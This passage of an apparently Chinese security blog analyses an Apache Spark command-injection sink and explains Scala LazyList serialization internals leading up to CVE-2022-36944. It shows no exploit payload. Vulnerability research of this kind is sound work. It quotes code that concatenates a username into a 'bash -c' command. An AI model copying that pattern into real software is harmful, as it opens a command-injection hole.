<span class="subst">$effectiveUser</span> is not authorized to access this page.&quot;</span>)</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><em>SecurityManager#isUserInACL</em></p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkAdminPermissions</span></span>(user: <span class="type">String</span>): <span class="type">Boolean</span> = &#123;</span><br><span class="line">    isUserInACL(user, adminAcls, adminAclsGroups)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><em>SecurityManager#isUserInACL</em></p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">isUserInACL</span></span>(</span><br><span class="line">      user: <span class="type">String</span>,</span><br><span class="line">      aclUsers: <span class="type">Set</span>[<span class="type">String</span>],</span><br><span class="line">      aclGroups: <span class="type">Set</span>[<span class="type">String</span>]): <span class="type">Boolean</span> = &#123;</span><br><span class="line">    <span class="keyword">if</span> (user == <span class="literal">null</span> ||</span><br><span class="line">        !aclsEnabled() ||</span><br><span class="line">        aclUsers.contains(<span class="type">WILDCARD_ACL</span>) ||</span><br><span class="line">        aclUsers.contains(user) ||</span><br><span class="line">        aclGroups.contains(<span class="type">WILDCARD_ACL</span>)) &#123;</span><br><span class="line">      <span class="literal">true</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 获取当前用户属组</span></span><br><span class="line">      <span class="keyword">val</span> userGroups = <span class="type">Utils</span>.getCurrentUserGroups(sparkConf, user)</span><br><span class="line">      logDebug(<span class="string">s&quot;user <span class="subst">$user</span> is in groups <span class="subst">$&#123;userGroups.mkString(&quot;,&quot;)&#125;</span>&quot;</span>)</span><br><span class="line">      aclGroups.exists(userGroups.contains(_))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><em>Utils#getCurrentUserGroups</em>*</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getCurrentUserGroups</span></span>(sparkConf: <span class="type">SparkConf</span>, username: <span class="type">String</span>): <span class="type">Set</span>[<span class="type">String</span>] = &#123;</span><br><span class="line">    <span class="comment">// 获取provider，默认provider为&quot;org.apache.spark.security.ShellBasedGroupsMappingProvider</span></span><br><span class="line">    <span class="comment">//val USER_GROUPS_MAPPING = ConfigBuilder(&quot;spark.user.groups.mapping&quot;)</span></span><br><span class="line">    <span class="comment">//.version(&quot;2.0.0&quot;)</span></span><br><span class="line">    <span class="comment">//.stringConf</span></span><br><span class="line">    <span class="comment">//.createWithDefault(&quot;org.apache.spark.security.ShellBasedGroupsMappingProvider&quot;)</span></span><br><span class="line">    <span class="keyword">val</span> groupProviderClassName = sparkConf.get(<span class="type">USER_GROUPS_MAPPING</span>)</span><br><span class="line">    <span class="keyword">if</span> (groupProviderClassName != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">val</span> groupMappingServiceProvider = classForName(groupProviderClassName).</span><br><span class="line">          getConstructor().newInstance().</span><br><span class="line">          asInstanceOf[org.apache.spark.security.<span class="type">GroupMappingServiceProvider</span>]</span><br><span class="line">          <span class="comment">// 获取属组</span></span><br><span class="line">        <span class="keyword">val</span> currentUserGroups = groupMappingServiceProvider.getGroups(username)</span><br><span class="line">        <span class="keyword">return</span> currentUserGroups</span><br><span class="line">      &#125; <span class="keyword">catch</span> &#123;</span><br><span class="line">        <span class="keyword">case</span> e: <span class="type">Exception</span> =&gt;</span><br><span class="line">          logError(<span class="string">log&quot;Error getting groups for user=<span class="subst">$&#123;MDC(USER_NAME, username)&#125;</span>&quot;</span>, e)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">EMPTY_USER_GROUPS</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><em>ShellBasedGroupsMappingProvider#getGroups</em></p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">getGroups</span></span>(username: <span class="type">String</span>): <span class="type">Set</span>[<span class="type">String</span>] = &#123;</span><br><span class="line">    <span class="comment">// 获取属组</span></span><br><span class="line">    <span class="keyword">val</span> userGroups = getUnixGroups(username)</span><br><span class="line">    logDebug(<span class="string">&quot;User: &quot;</span> + username + <span class="string">&quot; Groups: &quot;</span> + userGroups.mkString(<span class="string">&quot;,&quot;</span>))</span><br><span class="line">    userGroups</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>ShellBasedGroupsMappingProvider#getUnixGroups</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">getUnixGroups</span></span>(username: <span class="type">String</span>): <span class="type">Set</span>[<span class="type">String</span>] = &#123;</span><br><span class="line">    <span class="comment">// 直接进行参数拼接，且使用了bash -c</span></span><br><span class="line">    <span class="keyword">val</span> cmdSeq = <span class="type">Seq</span>(<span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;id -Gn &quot;</span> + username)</span><br><span class="line">    <span class="comment">// we need to get rid of the trailing &quot;\n&quot; from the result of command execution</span></span><br><span class="line">    <span class="type">Utils</span>.executeAndGetOutput(cmdSeq).stripLineEnd.split(<span class="string">&quot; &quot;</span>).toSet</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><em>Utils#executeAndGetOutput</em></p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">executeAndGetOutput</span></span>(</span><br><span class="line">      command: <span class="type">Seq</span>[<span class="type">String</span>],</span><br><span class="line">      workingDir: <span class="type">File</span> = <span class="keyword">new</span> <span class="type">File</span>(<span class="string">&quot;.&quot;</span>),</span><br><span class="line">      extraEnvironment: <span class="type">Map</span>[<span class="type">String</span>, <span class="type">String</span>] = <span class="type">Map</span>.empty,</span><br><span class="line">      redirectStderr: <span class="type">Boolean</span> = <span class="literal">true</span>): <span class="type">String</span> = &#123;</span><br><span class="line">        <span class="comment">// 执行命令</span></span><br><span class="line">    <span class="keyword">val</span> process = executeCommand(command, workingDir, extraEnvironment, redirectStderr)</span><br><span class="line">    <span class="keyword">val</span> output = <span class="keyword">new</span> <span class="type">StringBuilder</span></span><br><span class="line">    <span class="keyword">val</span> threadName = <span class="string">&quot;read stdout for &quot;</span> + command(<span class="number">0</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">appendToOutput</span></span>(s: <span class="type">String</span>): <span class="type">Unit</span> = output.append(s).append(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">val</span> stdoutThread = processStreamByLine(threadName, process.getInputStream, appendToOutput)</span><br><span class="line">    <span class="comment">// 等待命令执行完毕</span></span><br><span class="line">    <span class="keyword">val</span> exitCode = process.waitFor()</span><br><span class="line">    stdoutThread.join()   <span class="comment">// Wait for it to finish reading output</span></span><br><span class="line">    <span class="keyword">if</span> (exitCode != <span class="number">0</span>) &#123;</span><br><span class="line">      logError(<span class="string">s&quot;Process <span class="subst">$command</span> exited with code <span class="subst">$exitCode</span>: <span class="subst">$output</span>&quot;</span>)</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">SparkException</span>(<span class="string">s&quot;Process <span class="subst">$command</span> exited with code <span class="subst">$exitCode</span>&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    output.toString</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><em>Utils#executeCommand</em></p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">executeCommand</span></span>(</span><br><span class="line">      command: <span class="type">Seq</span>[<span class="type">String</span>],</span><br><span class="line">      workingDir: <span class="type">File</span> = <span class="keyword">new</span> <span class="type">File</span>(<span class="string">&quot;.&quot;</span>),</span><br><span class="line">      extraEnvironment: <span class="type">Map</span>[<span class="type">String</span>, <span class="type">String</span>] = <span class="type">Map</span>.empty,</span><br><span class="line">      redirectStderr: <span class="type">Boolean</span> = <span class="literal">true</span>): <span class="type">Process</span> = &#123;</span><br><span class="line">        <span class="comment">// 构建命令执行</span></span><br><span class="line">    <span class="keyword">val</span> builder = <span class="keyword">new</span> <span class="type">ProcessBuilder</span>(command: _*).directory(workingDir)</span><br><span class="line">    <span class="keyword">val</span> environment = builder.environment()</span><br><span class="line">    <span class="keyword">for</span> ((key, value) &lt;- extraEnvironment) &#123;</span><br><span class="line">      environment.put(key, value)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 执行命令</span></span><br><span class="line">    <span class="keyword">val</span> process = builder.start()</span><br><span class="line">    <span class="keyword">if</span> (redirectStderr) &#123;</span><br><span class="line">      <span class="keyword">val</span> threadName = <span class="string">&quot;redirect stderr for command &quot;</span> + command(<span class="number">0</span>)</span><br><span class="line">      <span class="function"><span class="keyword">def</span> <span class="title">log</span></span>(s: <span class="type">String</span>): <span class="type">Unit</span> = logInfo(s)</span><br><span class="line">      processStreamByLine(threadName, process.getErrorStream, log)</span><br><span class="line">    &#125;</span><br><span class="line">    process</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="LazyList反序列化漏洞（CVE-2022-36944）"><a href="#LazyList反序列化漏洞（CVE-2022-36944）" class="headerlink" title="LazyList反序列化漏洞（CVE-2022-36944）"></a>LazyList反序列化漏洞（CVE-2022-36944）</h3><h4 id="LazyList存储与求值原理"><a href="#LazyList存储与求值原理" class="headerlink" title="LazyList存储与求值原理"></a>LazyList存储与求值原理</h4><p><code>Scala</code> 的 <code>LazyList</code> 是一种惰性求值的集合类型，它可以在需要时才计算元素值，而不是像 <code>List</code> 一样在创建时就一次性计算所有元素。<code>LazyList</code> 可以处理无限序列和非常大的数据集，而不会导致内存溢出或性能问题。<br>以下代码展示了如何使用<code>LazyList</code>进行有限数据存储以及计算   </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">LazyListTest</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> ll:<span class="type">LazyList</span>[<span class="type">Int</span>] =  <span class="type">LazyList</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>)</span><br><span class="line">    ll.map(_ * <span class="number">2</span>).take(<span class="number">2</span>).foreach(println)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码首先创建<code>LazyList</code>对象，然后将每个元素都乘以<code>2</code>，然后取出前两个元素输出到标准输出设备中。<br><code>LazyList</code>除了可以处理有限数据外，还可以处理无限数据，下面的代码创建了一个从<code>1</code>开始步长为<code>2</code>的<code>LazyList</code>对象   </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">LazyListTest</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line">    <span class="keyword">val</span> ll:<span class="type">LazyList</span>[<span class="type">Int</span>] =  <span class="type">LazyList</span>.from(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">    ll.map(_ * <span class="number">2</span>).take(<span class="number">10</span>).foreach(println)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>执行结果如下<br><img src="/archives/2a377379/image-6.png" alt="alt text"><br>那么<code>LazyList</code>时如何实现无限数据的存储的呢？我们将从<code>form</code>方法开始进行解释   </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">from</span></span>(start: <span class="type">Int</span>, step: <span class="type">Int</span>): <span class="type">LazyList</span>[<span class="type">Int</span>] =</span><br><span class="line">   newLL(sCons(start, from(start + step, step)))</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>start</code>参数为起始值，<code>step</code>为步长。方法体中首先调用了<code>sCons</code>方法，再将其调用结果传入到<code>newLL</code>方法中。<code>sCons</code>的第二个参数递归地调用了<code>from</code>方法，且将<code>from</code>的第一个参数设置为前一次计算的<code>start</code>的值<code>+</code>步长。<code>sCons</code>方法创建了一个<code>Cons</code>对象，其主构造方法第一个参数称为<code>head</code>，表示序列的第一个值，第二个参数称为<code>tail</code>，表示剩余值的计算方法，即LazyList存储地不是所有的序列值，而是存储着序列的计算方法。  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Cons是State的子类</span></span><br><span class="line"><span class="meta">@inline</span> <span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">sCons</span></span>[<span class="type">A</span>](hd: <span class="type">A</span>, tl: <span class="type">LazyList</span>[<span class="type">A</span>]): <span class="type">State</span>[<span class="type">A</span>] = <span class="keyword">new</span> <span class="type">State</span>.<span class="type">Cons</span>[<span class="type">A</span>](hd, tl)</span><br></pre></td></tr></table></figure>
<p>而在<code>newLL</code>方法中则创建了<code>LazyList</code>对象，<code>LazyList</code>的构造方法接受的是一个无参匿名函数  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="meta">@inline</span> <span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">newLL</span></span>[<span class="type">A</span>](state: =&gt; <span class="type">State</span>[<span class="type">A</span>]): <span class="type">LazyList</span>[<span class="type">A</span>] = <span class="keyword">new</span> <span class="type">LazyList</span>[<span class="type">A</span>](() =&gt; state)</span><br></pre></td></tr></table></figure>
<p>看到这里，我们对<code>LazyList</code>对象的创建流程有了一定的了解，但是仍然不太能解释其为何能存储无限的数据集，看到其取值部分，其原理将豁然开朗。<br>对<code>LazyList</code>取值可通过<code>foreach</code>进行，该函数接受一个单参数匿名函数用以对遍历的结果进行处理，如<code>println</code>    </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="meta">@tailrec</span></span><br><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">foreach</span></span>[<span class="type">U</span>](f: <span class="type">A</span> =&gt; <span class="type">U</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line"> <span class="comment">// isEmpty是一个方法，scala中方法无参数可以省略()</span></span><br><span class="line">  <span class="keyword">if</span> (!isEmpty) &#123;</span><br><span class="line">    <span class="comment">// head也是一个方法</span></span><br><span class="line">    f(head)</span><br><span class="line">    tail.foreach(f)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>foreach</code>中，首先调用<code>isEmpty</code>方法判断当前<code>LazyList</code>对象是否为空，若为空则直接结束，若不为空则计算第一个值<code>head</code>并进行输出，然后对剩余的值<code>tail</code>递归调用<code>foreach</code>方法继续处理，从而实现了无限取值。<br><code>isEmpty</code>方法通过比较当前<code>state</code>是否为 <code>State.Empty</code>来判断<code>LazyList</code>对象是否为空  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">isEmpty</span></span>: <span class="type">Boolean</span> = state eq <span class="type">State</span>.<span class="type">Empty</span></span><br></pre></td></tr></table></figure>
<p>而<code>state</code>变量乃<code>LazyList</code>被创建时在类主体中被定义且<code>lazy</code>修饰  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SerialVersionUID</span>(<span class="number">3</span>L)</span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">LazyList</span>[+<span class="type">A</span>] <span class="title">private</span>(<span class="params">private[this] var lazyState: (</span>) <span class="title">=&gt;</span> <span class="title">LazyList</span>.<span class="title">State</span>[<span class="type">A</span>])</span></span><br><span class="line">  <span class="keyword">extends</span> <span class="type">AbstractSeq</span>[<span class="type">A</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="type">LinearSeq</span>[<span class="type">A</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="type">LinearSeqOps</span>[<span class="type">A</span>, <span class="type">LazyList</span>, <span class="type">LazyList</span>[<span class="type">A</span>]]</span><br><span class="line">    <span class="keyword">with</span> <span class="type">IterableFactoryDefaults</span>[<span class="type">A</span>, <span class="type">LazyList</span>]</span><br><span class="line">    <span class="keyword">with</span> <span class="type">Serializable</span> &#123;</span><br><span class="line">  <span class="keyword">import</span> <span class="type">LazyList</span>._</span><br><span class="line"></span><br><span class="line">  <span class="meta">@volatile</span> <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">var</span> stateEvaluated: <span class="type">Boolean</span> = <span class="literal">false</span></span><br><span class="line">  <span class="meta">@inline</span> <span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">stateDefined</span></span>: <span class="type">Boolean</span> = stateEvaluated</span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="keyword">var</span> midEvaluation = <span class="literal">false</span></span><br><span class="line">   <span class="comment">// lazy关键字修饰，懒加载，第一次被使用时才进行求值</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">lazy</span> <span class="keyword">val</span> state: <span class="type">State</span>[<span class="type">A</span>] = &#123;</span><br><span class="line">    <span class="comment">// if it&#x27;s already mid-evaluation, we&#x27;re stuck in an infinite</span></span><br><span class="line">    <span class="comment">// self-referential loop (also it&#x27;s empty)</span></span><br><span class="line">    <span class="keyword">if</span> (midEvaluation) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">RuntimeException</span>(<span class="string">&quot;self-referential LazyList or a derivation thereof has no more elements&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 中间求值标志</span></span><br><span class="line">    midEvaluation = <span class="literal">true</span></span><br><span class="line">    <span class="keyword">val</span> res = <span class="keyword">try</span> lazyState() <span class="keyword">finally</span> midEvaluation = <span class="literal">false</span></span><br><span class="line">    <span class="comment">// if we set it to `true` before evaluating, we may infinite loop</span></span><br><span class="line">    <span class="comment">// if something expects `state` to already be evaluated</span></span><br><span class="line">    <span class="comment">// 是否已经被求值</span></span><br><span class="line">    stateEvaluated = <span class="literal">true</span></span><br><span class="line">    lazyState = <span class="literal">null</span> <span class="comment">// allow GC</span></span><br><span class="line">    res</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>其实际上是调用了<code>lazyState</code>方法，该方法来自构造函数的参数<code>lazyState: () =&gt; LazyList.State[A]</code>，前面在创建<code>LazyList</code>调用<code>newLL</code>方法时传入的<code>sCons</code>方法返回对象即<code>state</code>的值，即一个<code>Cons</code>（<code>State</code>的子类）对象，当该<code>State</code>对象不为空(<code>Empty</code>)时，便可一直取值。<br>若要实现固定数量取值，可使用<code>take</code>方法  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">ll.take(<span class="number">10</span>).foreach(println)</span><br></pre></td></tr></table></figure>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">take</span></span>(n: <span class="type">Int</span>): <span class="type">LazyList</span>[<span class="type">A</span>] =</span><br><span class="line">  <span class="keyword">if</span> (knownIsEmpty) <span class="type">LazyList</span>.empty</span><br><span class="line">  <span class="keyword">else</span> (takeImpl(n): <span class="meta">@inline</span>)</span><br></pre></td></tr></table></figure>
<p>在<code>take</code>方法中首先调用<code>knownIsEmpty</code>方法判断当前<code>LazyList</code>是否为空，若为空则响应一个<code>Empty</code>对象，不为空则调用<code>takeImpl</code>方法<br>在<code>takeImpl</code>方法中，首先判断<code>n</code>的大小，如果小于<code>0</code>则响应一个<code>Empty</code>对象，该条件是<code>takeImpl</code>递归的基例。如果不为<code>0</code>则继续尝试调用<code>isEmpty</code>方法判断根<code>LazyList</code>对象是否被取空，若被取空则响应一个<code>Empty</code>对象并结束递归，若未被取空则创建一个<code>sCons</code>对象，该对象的第二个参数递归调用<code>takeImpl</code>方法，其参数值随着递归深度增加逐步减<code>1</code>直到最终为<code>0</code>时响应一个<code>Empty</code>对象，此时在调用<code>foreach</code>方法进行值输出时进行<code>isEmpty</code>判断将会返回<code>true</code>，从而实现了固定数量取值。  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">def</span> <span class="title">takeImpl</span></span>(n: <span class="type">Int</span>): <span class="type">LazyList</span>[<span class="type">A</span>] = &#123;</span><br><span class="line">  <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) <span class="type">LazyList</span>.empty</span><br><span class="line">  <span class="keyword">else</span> newLL &#123;</span><br><span class="line">    <span class="keyword">if</span> (isEmpty) <span class="type">State</span>.<span class="type">Empty</span></span><br><span class="line">    <span class="keyword">else</span> sCons(head, tail.takeImpl(n - <span class="number">1</span>))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>take</code>方法中<code>knownIsEmpty</code>会首先判断当前<code>stateEvaluated</code>（表示是否已经取过值，若没有取过值则该变量为false）是否为<code>true</code>，若该值为<code>false</code>则表示还没有开始取值，可以放心得继续取值，若该值为<code>true</code>，则还需判断<code>tail</code>是否为<code>Empty</code>，即值是否已经被取空了。  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="meta">@inline</span> <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="function"><span class="keyword">def</span> <span class="title">knownIsEmpty</span></span>: <span class="type">Boolean</span> = stateEvaluated &amp;&amp; (isEmpty: <span class="meta">@inline</span>)</span><br></pre></td></tr></table></figure>
<h4 id="LazyList序列化与反序列化"><a href="#LazyList序列化与反序列化" class="headerlink" title="LazyList序列化与反序列化"></a>LazyList序列化与反序列化</h4><p><code>LazyList</code>并没有实现<code>readObject/writeObject/readExternalObject/writeExternalObject</code>方法，却实现了<code>writeReplace</code>方法，该方法在序列化对象时将替换正在被序列化的<code>LazyList</code>对象，反序列化时若替换的对象中存在<code>readResolve</code>方法将使用该方法还原<code>LazyList</code>对象<br><code>LazyList</code>的<code>writeReplace</code>方法如下：  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span>[<span class="keyword">this</span>] <span class="function"><span class="keyword">def</span> <span class="title">writeReplace</span></span>(): <span class="type">AnyRef</span> =</span><br><span class="line">  <span class="keyword">if</span> (knownNonEmpty) <span class="keyword">new</span> <span class="type">LazyList</span>.<span class="type">SerializationProxy</span>[<span class="type">A</span>](<span class="keyword">this</span>) <span class="keyword">else</span> <span class="keyword">this</span></span><br></pre></td></tr></table></figure>
<p>当已经被求值且仍有值未被取走，将调用<code>SerializationProxy</code>的序列化以及反序列化方法</p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"> <span class="meta">@SerialVersionUID</span>(<span class="number">3</span>L)</span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationProxy</span>[<span class="type">A</span>](<span class="params">@transient protected var coll: <span class="type">LazyList</span>[<span class="type">A</span>]</span>) <span class="keyword">extends</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="function"><span class="keyword">def</span> <span class="title">writeObject</span></span>(out: <span class="type">ObjectOutputStream</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    out.defaultWriteObject()</span><br><span class="line">    <span class="keyword">var</span> these = coll</span><br><span class="line">    <span class="keyword">while</span>(these.knownNonEmpty) &#123;</span><br><span class="line">      out.writeObject(these.head)</span><br><span class="line">      these = these.tail</span><br><span class="line">    &#125;</span><br><span class="line">    out.writeObject(<span class="type">SerializeEnd</span>)</span><br><span class="line">    out.writeObject(these)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="function"><span class="keyword">def</span> <span class="title">readObject</span></span>(in: <span class="type">ObjectInputStream</span>): <span class="type">Unit</span> = &#123;</span><br><span class="line">    in.defaultReadObject()</span><br><span class="line">    <span class="keyword">val</span> init = <span class="keyword">new</span> <span class="type">ArrayBuffer</span>[<span class="type">A</span>]</span><br><span class="line">    <span class="keyword">var</span> initRead = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">while</span> (!initRead) in.readObject <span class="keyword">match</span> &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="type">SerializeEnd</span> =&gt; initRead = <span class="literal">true</span></span><br><span class="line">      <span class="keyword">case</span> a =&gt; init += a.asInstanceOf[<span class="type">A</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">val</span> tail = in.readObject().asInstanceOf[<span class="type">LazyList</span>[<span class="type">A</span>]]</span><br><span class="line">    coll = init ++: tail</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="function"><span class="keyword">def</span> <span class="title">readResolve</span></span>(): <span class="type">Any</span> = coll</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在进行序列化时将调用<code>writeObject</code>方法。<br>首先将会调用输出流对象的<code>defaultWriteObject</code>方法，然后调用<code>LazyList</code>对象<code>these</code>的<code>knownNonEmpty</code>方法判断是否已经被求值且仍有值未被取走则首先将被取出的值进行常规的序列化，然后将剩余值的计算方法（<code>tail</code>）赋值给<code>these</code>变量。当所有的被计算过的值都被取出后则退出循环，然后插入一个序列化终止标志，最后再将<code>these</code>进行序列化。插入序列化终止标志是为了分割两种不同的序列化对象，终止标志前的部分为被计算过的值，而后面的部分为剩余值的计算方法（<code>tail</code>）。<br>在进行反序列化时将先调用<code>readObject</code>方法，再调用<code>readResolve</code>方法。<br><code>readObject</code>方法中，首先调用输入流对象的<code>defaultReadObject</code>方法，然后创建缓冲列表<code>init</code>用以存储被反序列化的计算值，标志<code>initRead</code>用以判断计算值是否被读取完毕，若读取完毕则反序列化剩余值的计算方法并赋值给<code>tail</code>变量，然后调用<code>init</code>的<code>++:</code>方法，对已计算值与计算方法进行连接。  </p>
<h3 id="LazyList反序列化漏洞成因"><a href="#LazyList反序列化漏洞成因" class="headerlink" title="LazyList反序列化漏洞成因"></a>LazyList反序列化漏洞成因</h3><p>在调用<code>++:</code>方法时漏洞产生了  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line">@`inline` <span class="keyword">override</span> <span class="keyword">final</span> <span class="function"><span class="keyword">def</span> <span class="title">++</span></span>: [<span class="type">B</span> &gt;: <span class="type">A</span>](prefix: <span class="type">IterableOnce</span>[<span class="type">B</span>]): <span class="type">CC</span>[<span class="type">B</span>] = prependedAll(prefix)</span><br></pre></td></tr></table></figure>
<p><code>prependedAll</code>方法在<code>LazyList</code>中被重写  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">prependedAll</span></span>[<span class="type">B</span> &gt;: <span class="type">A</span>](prefix: collection.<span class="type">IterableOnce</span>[<span class="type">B</span>]): <span class="type">LazyList</span>[<span class="type">B</span>] =</span><br><span class="line">  <span class="keyword">if</span> (knownIsEmpty) <span class="type">LazyList</span>.from(prefix)</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (prefix.knownSize == <span class="number">0</span>) <span class="keyword">this</span></span><br><span class="line">  <span class="keyword">else</span> newLL(stateFromIteratorConcatSuffix(prefix.iterator)(state))</span><br></pre></td></tr></table></figure>
<p><code>knownIsEmpty</code>方法用于判断计算方法中是否仍有值未被计算  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="comment">// stateEvaluated 需要为true，即有值被计算过  </span></span><br><span class="line">  <span class="meta">@inline</span> <span class="keyword">private</span>[<span class="keyword">this</span>] <span class="function"><span class="keyword">def</span> <span class="title">knownIsEmpty</span></span>: <span class="type">Boolean</span> = stateEvaluated &amp;&amp; (isEmpty: <span class="meta">@inline</span>)</span><br></pre></td></tr></table></figure>
<p><code>isEmpty</code>方法判断是否有值仍未被计算  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">isEmpty</span></span>: <span class="type">Boolean</span> = state eq <span class="type">State</span>.<span class="type">Empty</span></span><br></pre></td></tr></table></figure>
<p>前面已经提到过<code>state</code>来自<code>lazyState</code>方法的计算结果，而<code>lazyState</code>来自于实例化<code>LazyList</code>对象时传的一个无参匿名函数。  </p>
